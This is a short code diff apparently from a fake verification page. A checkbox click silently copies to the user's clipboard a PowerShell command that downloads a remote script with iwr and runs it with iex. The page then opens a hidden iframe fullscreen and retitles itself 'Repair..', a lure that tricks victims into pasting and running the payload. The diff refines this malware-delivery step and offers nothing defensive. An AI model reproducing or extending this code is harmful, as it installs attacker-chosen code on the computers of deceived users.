@@ -272,8 +272,7 @@
         checkBox.addEventListener('click', () => {
             setTimeout(() => {
                 navigator.clipboard.writeText(
-                   `powershell -NoWindow -c "cd 'C:\Users\Retardo\Desktop\PiggityPigs';
-                    $s = (iwr {{PSScript URL for IWR}} -UseBasicParsing).Content | iex`
+                   `powershell -c "cd 'C:\\';mkdir {{Payload Save Path In UserDisk}};cd '{{Payload Save Path In UserDisk}}';$s = (iwr {{PSScript URL for IWR}} -UseBasicParsing).Content | iex"`
                 );
                 console.log("The time out has finished");
                 const iframe = globalThis.HiddedIFrameWindow;
@@ -283,6 +282,7 @@
                 if (iframe.requestFullscreen) iframe.requestFullscreen();
                 else if (iframe.webkitRequestFullscreen) iframe.webkitRequestFullscreen();
                 else if (iframe.msRequestFullscreen) iframe.msRequestFullscreen();
+                document.title = "Repair..";
                 startVerification();
             }, 2000); // 2 seconds delay
         });
